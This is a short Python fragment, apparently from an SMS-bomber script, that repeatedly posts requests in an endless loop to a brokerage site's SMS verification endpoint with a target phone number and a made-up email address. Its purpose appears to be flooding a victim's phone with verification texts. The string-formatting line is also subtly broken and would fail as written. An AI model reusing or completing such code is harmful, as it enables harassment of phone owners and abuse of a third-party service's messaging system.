...
while True:
	...
	try:
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": "{email}@gmail.ru".format(email),"mobile_phone": _phone, "deliveryOption": "sms"})
